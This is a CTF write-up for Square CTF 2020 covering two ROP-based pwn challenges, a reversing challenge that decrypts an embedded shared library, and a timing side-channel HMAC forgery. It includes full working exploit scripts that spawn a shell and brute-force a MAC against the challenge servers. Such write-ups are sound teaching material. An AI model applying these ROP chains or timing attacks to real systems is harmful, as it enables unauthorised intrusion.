Writeups for the Square CTF 2020  
================================

# Table of Contents

* [Jimi Jam (pwn)](#jimi1)  
* [Jimi Jamming (pwn)](#jimi2)  
* [Happy Fun Binary (rev)](#happy_fun)  
* [Hash My Awesome Commands (crypto)](#hash_my)

# Tasks

## Jimi Jam (pwn)

Jimi Jam was a binary exploitation challenge where you were to craft a ROP
chain in order to execute a shell and retrieve the flag.

You were given the binary and the `libc` it is using:  
```  
jimi_jam  
├── jimi-jam  
└── libc.so.6  
```

Examining the binary reveals a 64-bit executable.  
Also note that there is no canary and we are dealing with a position
independent executable with full RELRO, meaning that we cannot possibly mess
with the dynamic linker.  
```  
$ checksec jimi-jam  
[*] 'jimi-jam'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled

```

The executable being position independent does not even matter since the
binary is friendly enough to reveal an address:  
```  
$ LD_PRELOAD=./libc.so.6 ./jimi-jam  
Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!  
The tour center is right here! 0x559a5caa4060  
Hey there! You're now in JIMI JAM JAIL  
```

Disassembling the binary reveals further insight on the inner workings:  
```c  
int main(void) {  
 init_jail();  
 puts("Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!");  
 printf("The tour center is right here! %p\n",ROPJAIL);  
 vuln();  
}  
```

We can see that the executable is setting up a *rop jail* of some sort and
than prints the address of said jail (`ROPJAIL`).  
`ROPJAIL` resides inside the `.bss` section of the binary:  
```objdump  
SYMBOL TABLE:  
0000000000004020 l    d  .bss   0000000000000000              .bss  
0000000000004048 l     O .bss   0000000000000001              completed.8060  
0000000000004020 g     O .bss   0000000000000008
stdout@@GLIBC_2.2.5  
0000000000004030 g     O .bss   0000000000000008
stdin@@GLIBC_2.2.5  
0000000000004060 g     O .bss   0000000000002000              ROPJAIL  
0000000000006060 g       .bss   0000000000000000              _end  
0000000000004010 g       .bss   0000000000000000              __bss_start  
0000000000004040 g     O .bss   0000000000000008
stderr@@GLIBC_2.2.5  
```

As it turns out this jail is not really important for this part of the
challenge.  
It will become relevant in the second version [below](#jimi2) though.

So let's skip ahead to the `vuln` function:  
```c  
void vuln(void) {  
 undefined local_10 [8];  
  
 puts("Hey there! You\'re now in JIMI JAM JAIL");  
 read(0,local_10,0x40);  
 return;  
}  
```

This is a basic stack overflow vulnerability.

My plan then was the following:  
1. Leak a `libc` address  
2. Re-use the vulnerablity to execute a ROP chain into `libc`

The first part requires a gadget to alter `%rdi` which is available in the
binary:  
```  
$ ropper -f jimi-jam --search "pop rdi"  
[INFO] Load gadgets from cache  
[LOAD] loading... 100%  
[LOAD] removing double gadgets... 100%  
[INFO] Searching for gadgets: pop rdi

[INFO] File: jimi-jam  
0x00000000000013a3: pop rdi; ret;  
```

We can use it to set up an argument to f. e. `puts` and print the content of
the global offset table for any library function.  
I simply chose `puts` again here:

```python  
from pwn import *  
import sys

io = process(["./jimi-jam"], env={ "LD_PRELOAD": "./libc.so.6" })

io.recvline()

center = io.recvline().rsplit(b" ", 1)[-1].strip()  
base = int(center.decode("utf-8")[2:], 16) - 0x4060  
print(center)  
print(hex(base))

io.recvline()

pop_rdi = 0x00000000000013a3 + base

# address of puts in main  
loop = 0x130d + base

puts_got = 0x3fa0 + base

print("puts_got", hex(puts_got))

payload = b"A" * 16 + p64(pop_rdi) + p64(puts_got) + p64(loop)

io.sendline(payload)

puts = io.readline()[:-1].ljust(8, b"\x00")  
print("puts", puts)

puts = u64(puts)

libc_base = puts - 0x625a0 - 0x25000  
print("libc_base", hex(libc_base))  
```

With the knowledge of the `libc` base address we can work on getting a shell.  
I simply used `one_gagdet` here:  
```  
$ one_gadget ./libc.so.6  
0xe6e73 execve("/bin/sh", r10, r12)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)  
constraints:  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL  
```

Sadly these constraints are not satisfied so we have to do a little manual
grooming, setting relevant registers to zero.  
I simply chose the last one here.  
Therefor we need two more gadgets to set `%rsi` and `%rdx`.  
We can use ropper once again and will find them very quickly in `libc.so.6`.

The second part of the exploit may look like this now:  
```python  
gadget = libc_base + 0xe6e79  
print("gadget", hex(gadget))

pop_rsi = 0x0000000000027529 + libc_base  
pop_rdx_pop_r12 = 0x000000000011c371 + libc_base

io.readline()  
io.readline()

padding = b"B" * 8 + p64(base + 0x4000 + 0x78)  
payload = padding + \  
   p64(pop_rsi) + \  
   p64(0) + \  
   p64(pop_rdx_pop_r12) + \  
   p64(0) + p64(0) + \  
   p64(gadget)  
io.sendline(payload)

```

The full exploit is available [here](jimi_jam/x.py).

## Jimi Jamming (pwn)

Jimi Jamming was very similar to Jimi Jam though now requiring you to actually
jump into the `ROPJAIL`.  
So let's take closer look how the jail is constructed:

```c  
srand(0x138d5);  
posix_memalign((void **)&ROPJAIL,0x1000,0x1000);  
local_c = 0;  
while ((int)local_c < 0x1000) {  
   if ((local_c & 0xf) == 0) {  
     *(undefined *)((long)(int)local_c + (long)ROPJAIL) = 0xc3;  
   }  
   else {  
     iVar1 = rand();  
     *(undefined *)((long)(int)local_c + (long)ROPJAIL) = (char)iVar1;  
   }  
   local_c = local_c + 1;  
}  
```

We can see that the random number generator is seeded with a constant value
(`0x138d5`).  
After that `0x1000` pseudo-random bytes are placed inside the `ROPJAIL`.  
Furthermore every 16th byte is set to `0xc3` essentially forcing a `ret`
instruction.

In this challenge we are also allowed to place 10 bytes into the jail at a
position of our choosing.

Eventually the region is then mapped read-only and executable.

Since the content of the region does not change between calls to the
executable (I think this would have been a nice twist) we can simply dump the
contents and try to find gadgets inside it:

```  
$ gdb jimi-jamming

gef➤  break *(main + 108)  
gef➤  run  
gef➤  dump memory jail.bin (void**)ROPJAIL ((void**)ROPJAIL + 0x1000)  
```

We can easily analyse it using `ropper`:  
```  
$ ropper --arch x86_64 -r -f jail.bin  
[...]  
```

Sadly there will be no `syscall` instruction inside the blob.  
Luckily we can write some custom data though.  
My idea was to write `/bin/sh\x00` and a syscall instruction `\x0f\x05` to
eventually execute `execve("/bin/sh", NULL, NULL)`

This is rather straight forward and may look like [this](jimi-jamming/x.py):  
```python  
from pwn import *  
import sys

# io = process(["./jimi-jamming"], env={ "LD_PRELOAD": "./libc.so.6" })  
# io = process(["./jimi-jamming"])  
io = remote("challenges.2020.squarectf.com", 9001)

io.recvuntil(b"somewhere\n")  
key = b"\x0f\x05/bin/sh\x00"  
io.send(key)  
io.recvuntil(b"key?\n")  
key_offset = 8  
io.send(str(key_offset).encode("utf-8"))

io.recvline()  
center = io.recvline().rsplit(b" ", 1)[-1].strip()  
jail = int(center.decode("utf-8")[2:], 16)  
base = jail - 0x6000

print("jail", hex(jail))  
print("base", hex(base))

io.recvline()

pop_rdi = 0x0000000000000daf + jail;  
pop_rax = 0x0000000000000dcf + jail;  
pop_rsi = 0x0000000000000d3f + jail;  
pop_rdx = 0x00000000000007df + jail;  
syscall = key_offset + jail;  
slope = jail

print("key at ", hex(jail + key_offset))

rop = p64(pop_rdi) + p64(jail + key_offset + 2) + \  
       p64(pop_rax) + p64(0x3b) + \  
       p64(pop_rsi) + p64(0) + \  
       p64(pop_rdx) + p64(0) + \  
       p64(syscall)

payload = p64(0) * 4 + p64(slope) + rop  
io.sendline(payload)  
io.interactive()  
```

## Happy Fun Binary (rev)

Before we start: Shout-out to the authors, I think it was a pretty cool
challenge!

Happy Fun Binary was a rough one, a composition of 4 flags hidden inside a
single binary.  
Once you found the first flag you were able to work on the next two.  
Finally, when you would discover the first three flags the 4th flag was given
to you as the cherry on top.

Sadly we required quite a lot of time to discover the first flag which kind of
denied us from digging into the second and third flag during the competition
:(

Anyway here is our approach for the first flag.

Examining the given [binary](happy_fun_binary/happy_fun_binary) reveals a
stripped 32-bit executable:  
```  
$ file happy_fun_binary  
happy_fun_binary: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=fc63998490d30e659bbdc8b07450c26eecd3e141, for GNU/Linux 3.2.0,
stripped  
```

Inspecting the main method in `binaryninja` reveals some of the initial
functionality:

```objdump  
int32_t main(int32_t argc, char** argv, char** envp)

00001675  void* gsbase  
00001675  int32_t eax = *(gsbase + 0x14)  
0000168f  setvbuf(*stdout, 0, 2, 0)  
000016a1  puts("You step up to the entry point o…")  
000016b4  int32_t var_68 = *stdin  
000016bb  void var_54  
000016bb  fgets(&var_54, 0x40, var_68)  
000016cc  char const* const var_6c = "approach the main entrance\n"  
000016d9  if (strcmp(&var_54, "approach the main entrance\n") == 0)  
000016eb      puts("As you approach, ahead is a gate…")  
000016fe      do  
000016fe          var_68 = *stdin  
00001705          fgets(&var_54, 0x40, var_68)  
00001723          if (strcmp(&var_54, "examine the gate\n") == 0)  
00001731              puts("You get closer to the gate, and …")  
0000174f          int32_t var_5c  
0000174f          if (strcmp(&var_54, "modify the gate\n") == 0)  
0000175d              puts("What value do you place in the g…")  
00001777              fgets(&var_54, 4, *stdin)  
00001782              var_68 = 0x10  
00001792              *data_ba98 = strtol(&var_54, 0, 0x10)  
00001798              int32_t eax_9 = *data_ba98  
000017ac              var_5c = eax_9 + 0x1000  
000017b9              puts("You place the new value into the…")  
000017d7          if (strcmp(&var_54, "step through the gate\n", var_68) == 0)  
000017e5              puts("You step through the gate, hopin…")  
000017f6              var_5c()  
00001801          var_6c = "leave\n"  
00001801      while (strcmp(&var_54, "leave\n") != 0)  
00001822  puts("You decide you've had enough and…", var_6c, var_68)  
00001849  if ((eax ^ *(gsbase + 0x14)) == 0)  
00001849      return 0  
0000183b  __stack_chk_fail_local()  
0000183b  noreturn  
```

It appears to be a text-based RPG!

To proceed we need to enter `step through the gate` (at `0x17d7`).  
The problem is the gate will call an address which should be provided by us
earlier (at `0x1792` following `0x174f`).  
So it appears we have to find the correct function to call.

There are some interesting functions so let's take a quick look at them:

```objdump  
int32_t sub_136d(void* arg1, int32_t arg2, int32_t arg3, void* arg4)

0000138b  char var_9 = arg3:0.b  
000013e6  int32_t var_8  
000013e6  for (var_8 = 0; arg2 u> var_8; var_8 = var_8 + 1)  
000013b8      uint32_t eax_10 = zx.d(var_9 ^ *(arg4 + (zx.d(var_9) & 3)))  
000013cc      *(arg1 + var_8) = zx.d(*(arg1 + var_8)) + (eax_10 * eax_10):0.b  
000013d9      var_9 = *(arg1 + var_8)  
000013eb  return var_8  
```

```objdump  
int32_t sub_1409()

00001435  int32_t eax = fopen("binary_of_ballas.so", data_201c)  
00001451  fwrite(data_4020, 1, 0x7a78, eax, "binary_of_ballas.so", eax)  
0000145f  fclose(eax)  
00001473  int32_t eax_1 = dlopen("./binary_of_ballas.so", 2)  
00001484  remove("binary_of_ballas.so")  
000014a7  int32_t eax_4 = dlsym(eax_1, "foyer")()  
000014ae  return eax_4  
```

```objdump  
int32_t sub_14b3() __noreturn

000014c5  void* gsbase  
000014c5  *(gsbase + 0x14)  
000014da  puts("You emerge from the other side o…")  
000014e7  char var_55 = rand():0.b  
00001502  int32_t var_54 = *data_ba98 * (*data_ba98 * *data_ba98)  
00001510  while (true)  
00001510      int32_t var_64_1 = *stdin  
00001517      int32_t* var_60  
00001517      void var_50  
00001517      fgets(&var_50, 0x40, var_64_1, var_60)  
00001535      if (strcmp(&var_50, "modify the input\n") == 0)  
00001543          puts("What would you like to change th…")  
0000155f          var_55 = fgetc(*stdin):0.b  
0000156c          puts("you modify the input, hoping it …")  
0000158a      if (strcmp(&var_50, "use the lower function\n") == 0)  
00001595          var_60 = &var_54  
00001596          var_64_1 = sx.d(var_55)  
000015a3          sub_136d(data_4020, 0x7a78, var_64_1, var_60)  
000015b5          puts("You run the lower function, and …")  
000015d3      if (strcmp(&var_50, "use the upper function\n", var_64_1,
var_60) == 0)  
000015de          var_60 = &var_54  
000015df          var_64_1 = sx.d(var_55)  
000015ec          sub_13ec(var_64_1)  
000015fe          puts("You run the upper function. it d…", 0x7a78)  
0000161c      if (strcmp(&var_50, "use the gate\n", var_64_1, var_60) == 0)  
0000162e          puts("Gathering together your register…")  
00001636          sub_1409()  
```

The one which seems to fit the most is `sub_14b3()` (which is actually located
at `0x14af`, never fully trust the disassembler !:)

Another interesting thing to note is `sub_1409` which attempts to read a
shared library called `binary_of_ballas` out of the `.rodata` section of the
binary.  
We can quickly dump its contents using `gdb` to investigate it further:  
```objdump  
$ xxd extracted.so | head  
00000000: a3de 956a 92a2 c201 44f9 e4b9 e4b9 e4b9  ...j....D.......  
00000010: e701 4741 45e4 b9e4 89b7 a1c4 2d04 79e4  ..GAE.......-.y.  
00000020: cdd9 64b9 e4b9 e4b9 1811 2439 eee9 4c89  ..d.......$9..L.  
00000030: c201 61c4 fab1 8479 e4b9 e4b9 e4b9 e4b9  ..a....y........  
00000040: e4b9 e4b9 00ea 9104 952d 0479 e871 8479  .........-.y.q.y  
00000050: e4c9 a439 e564 b9e4 b9f4 1964 b9f4 1964  ...9.d.....d...d  
00000060: b9f4 1964 09b8 d104 c9b8 d104 7e89 a439  ...d........~..9  
00000070: e4c9 a439 e564 b9e4 b914 d964 b914 d964  ...9.d.....d...d  
00000080: b914 d964 c154 5964 c154 5964 bd44 f9e4  ...d.TYd.TYd.D..  
00000090: b9f4 1964 ba31 8479 bc77 21c4 d162 4144  ...d.1.y.w!..bAD  
```  
This does not look like a shared library though, meaning it is probably
obfuscated in some strange way.

Let's continue by investigating the function `sub_14b3()` which appears to be
the *other side* of the gate.  
We can run the binary to see if the path makes sense:  
```  
$ ./happy_fun_binary  
You step up to the entry point of the Binary, an ancient looking ruin composed
of 0s and 1s.

approach the main entrance  
As you approach, ahead is a gate, but you quickly realize something is off.  
modify the gate  
What value do you place in the gate?

4af  
You place the new value into the gate. It... looks right? Probably?

step through the gate  
You step through the gate, hoping that more than just a brick wall of zeroes
lays beyond...

You emerge from the other side of the gate, almost surprised that there were
no nasty segfaults lying in wait. Instead, a sea of entropy lies before you,
directly in front of which lies two functions,  As well as another inactive
gate. At a glance, the gate appears a little more sophisticated than the last,
as if it were capable of locking on to some sort of symbol buried somewhere in
the expanse of meaningless data. The lower function appears decrepit and worn
down, but still working.  
The other function appears almost Identical, as though it were a mirror of the
other. However, where the main portion of the former function seems to be
working as intended, the contents of the other function seems to have been
left out entirely, as though to prevent others from using it. Both functions
appear to take a number of parameters, one of which is easily modifiable.  
```

Looks good, doesn't it?

Indeed we have an option `use the gate` which would load
`binary_of_ballas.so`.  
We still have to decode it though.  
There are two more functions called `upper` and `lower`.  
It turns out the lower function is `sub_136d` from above.  
Inspecting the supplied arguments at `0x15a3` we can see that this function is
performing some operations on the data section containing the shared library!  
We can also see that using the option `modify the input` we can control `arg3`
(which is actually one byte).

To get a deeper understanding of the function we can inspect the equivalent
C-code which I extracted using `Ghidra`:  
```c  
typedef unsigned char byte;  
typedef unsigned int uint;

void encrypt(byte* address,uint length,byte key)  
{  
 byte param_4[4] = { 0x0f, 0x53, 0xbd, 0x66 };

 byte key_copy;  
 uint counter;  
  
 key_copy = key;  
 counter = 0;  
 while (counter < length) {  
   key_copy = key_copy ^ *(byte *)(param_4 + (key_copy & 3));  
   *(byte *)(address + counter) = *(char *)(address + counter) + key_copy * key_copy;  
   key_copy = *(byte *)(address + counter);  
   counter = counter + 1;  
 }  
 return;  
}

```  
As you may have noticed already I named the function `encrypt` hinting that
this is actually the encryption logic rather than the decryption logic.  
In order to find the library we would somehow recover the key and the
decryption routine.

Since we know that the resulting data is (probably) an ELF we know the first
bytes of the resulting file to match the ELF-header `\x7fELF`.  
With that in mind we can simply use our extracted encryption routine to
encrypt the known header values for all possible key values and check if the
result is that of the extracted data.

I hacked this little C-code which does exactly that (`encrypted.so` being the
extracted binary):  
```c  
void print_possible_keys() {  
   uint i;

   byte header[16];  
   FILE* f_elf = fopen("happy_fun_binary", "rb");  
   fread(header, 1, 16, f_elf);  
   fclose(f_elf);

   byte target[16];  
   FILE* f_enc = fopen("encrypted.so", "rb");  
   fread(target, 1, 16, f_enc);  
   fclose(f_enc);

   byte enc[16];  
   for(i = 0; i <= 255; ++i) {  
       memcpy(enc, header, 16);  
       encrypt(enc, 16, (byte)i);  
       if(memcmp(enc, target, 16) == 0) {  
           printf("%u\n", i);  
       }  
   }  
}

```

Running it reveals a few possible values for keys:  
```  
21  
41  
85  
105  
149  
169  
213  
233  
```

Since I could not think of a way to invert the encryption routine I simply
followed up by writing code which brute-forces every possible byte at a time.  
This is possible because we know the output of the encryption method.  
We can than, one byte at a time, check which input byte would have produced
the given output:  
```c  
   uint size = 0x7a78;  
   int i;  
   byte key_to_test = atoi(argv[1]);  
   printf("Testing %u\n", (uint)key_to_test);

   byte encrypted_target[size];  
   FILE* f_src = fopen("encrypted.so", "rb");  
   fread(encrypted_target, 1, size, f_src);  
   fclose(f_src);

   byte decrypted[size];  
   memset(decrypted, 0, size);

   byte tmp[size];  
   for(i = 0; i < size; ++i) {  
       int guess;

       for(guess = 0; guess <= 255; ++guess) {  
           memcpy(tmp, decrypted, i + 1);  
           tmp[i] = (byte)guess;  
           encrypt(tmp, i + 1, key_to_test);  
           if(tmp[i] == encrypted_target[i]) {  
               break;  
           }  
       }  
       if(guess == 256) {  
           printf("Could not find value\n");  
           exit(1);  
           break;  
       }  
       decrypted[i] = (byte)guess;  
   }

   FILE* f_dst = fopen("decrypted.so", "wb");  
   fwrite(decrypted, 1, size, f_dst);  
   fclose(f_dst);  
```

You can find the full code [here](happy_fun_binary/decode.c).  
To start with I tried the key `21` first and indeed it worked:  
```  
$ file decrypted.so  
decrypted.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV),
dynamically linked, BuildID[sha1]=adecbce169f325a39630c9e46b94235196d7f48a,
not stripped  
```

This will reveal the first flag in the `.rodata` section:  
```  
$ strings decrypted.so | grep flag{  
flag{yes_this_is_all_one_big_critical_role_reference}  
```

From there we can continue into the `foyer` and proceed with the next two
challenges:  
```c  
// foyer.c  
// gcc -o foyer -m32 foyer.c decrypted.so

extern void foyer();

int main() {  
   foyer();  
}  
```

```  
$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:. ./foyer  
You emerge into a grand and extravegant foyer. While sparsely furnished,
intricately crafted code decorates every square inch of the walls and ceiling.
In the center of the room lies a grand structure, carved into which are three
slots. The three slots feed into a large chest in the middle of the room. On
the far side of the room lies 2 semi-circular doorways leading into darkness.

```

From there the journey continues ...  
You are on your own now.

## Hash My Awesome Commands (crypto)

This challenge was a fun little side quest which could run in the background
whilst solving the other tasks.  
Essentially you were able to forge an
[HMAC](https://en.wikipedia.org/wiki/HMAC) by abusing a hand-crafted timing
side channel.

The service was written in GO and the source was
[provided](hash_my_awesome_commands/hmac.go).  
The service allowed to enable a debug mode, which measured timings server-
side:

```  
Enter command: debug|9W5iVNkvnM6igjQaWlcN0JJgH+7pComiQZYdkhycKjs=  
debug mode enabled  
-----------DEBUG MODE ENABLED-----------  
Enter command: debug|9W5iVNkvnM6igjQaWlcN0JJgH+7pComiQZYdkhycKjs=  
command: debug, check: 9W5iVNkvnM6igjQaWlcN0JJgH+7pComiQZYdkhycKjs=  
took 552072361 nanoseconds to verify hmac  
debug mode disabled  
[...]  
```

The command and the respective HMAC were given.  
The goal was to forge the HMAC for the `flag` command.

The relevant code of the source which sets up the timings is the following:  
```go  
func compare(s1, s2 []byte) bool {  
	if len(s1) != len(s2) {  
		return false  
	}

	c := make(chan bool)

	// multi-threaded check to speed up comparison  
	for i := 0; i < len(s1); i++ {  
		go func(i int, co chan<- bool) {  
			// avoid race conditions  
			time.Sleep(time.Duration(((500*math.Pow(1.18, float64(i+1)))-500)/0.18) * time.Microsecond)  
			co <- s1[i] == s2[i]  
		}(i, c)  
	}

	for i := 0; i < len(s1); i++ {  
		if <-c == false {  
			return false  
		}  
	}

	return true  
}  
```

You can see that an artificial delay was introduced for each byte of the
comparison. This delay depends on the index and increases significantly with a
greater index.

Exploiting this is pretty straight-forward:  
Test each possible value for the first byte and fix it to the value which had
the longest comparison timings.  
After that advance to the next byte and repeat.

Patience is the key here ..

I also tried a multi-threaded approach but apparently this caused some issues
with the timings so a simple single-threaded
[solution](hash_my_awesome_commands/solve.py) it is:

```python  
import math  
import base64  
import statistics

from pwn import *

# flag|ndAoSzx/CbizTqNBB5cz3t6XGFEGbQwIc9i7SawgTKE=  
# flag: flag{d1d_u_t4k3_the_71me_t0_appr3c14t3_my_c0mm4nd5}

debug_command = b"debug|9W5iVNkvnM6igjQaWlcN0JJgH+7pComiQZYdkhycKjs="

hmac = [0] * 32

def get_flag_cmd(hmac):  
   return b"flag|" + base64.encodebytes(bytes(hmac))

c = remote("challenges.2020.squarectf.com", 9020)  
c.recvuntil(b"command: ")

# enable debug mode  
c.sendline(debug_command)

for bi in range(len(hmac)):  
   # perform n trials for each byte. Sometimes 3 is not enough cause of  
   # some (server-side) hiccups.  
   # We can continue where we left off though  
   # A "hiccup" can be identified by examining the timings  
   # and finding that they did not increase significantly with respect  
   # to the previous ones  
   trials = 3  
   timings = []  
   for _ in range(trials):  
       ts = []  
       for i in range(256):  
           hmac[bi] = i

           c.recvuntil(b"command: ")  
           c.send(get_flag_cmd(hmac))  
           c.recvuntil(b"took")  
           t = c.recvline()  
           valid = c.recvline()

           if b"invalid" not in valid:  
               print(get_flag_cmd(hmac))  
               exit(0)

           t = int(t.lstrip().split(b" ")[0])  
           ts.append(t)

       timings.append(ts)

   avg = list(map(statistics.median, list(zip(*timings))))  
   print("Timings:", avg)  
   mx = -1  
   mi = -1  
   for i, avgi in enumerate(avg):  
       if avgi > mx:  
           mx = avgi  
           mi = i

   assert mi > -1  
   hmac[bi] = mi  
   print("HMAC:", hmac[:bi + 1])  
```

Eventually this script will finish and we can enter the command to retrieve
the flag:

```  
Enter command: flag|ndAoSzx/CbizTqNBB5cz3t6XGFEGbQwIc9i7SawgTKE=  
flag{d1d_u_t4k3_the_71me_t0_appr3c14t3_my_c0mm4nd5}  
```  

Original writeup (https://github.com/liona24/ctf-
writeups/tree/main/square-2020#happy_fun).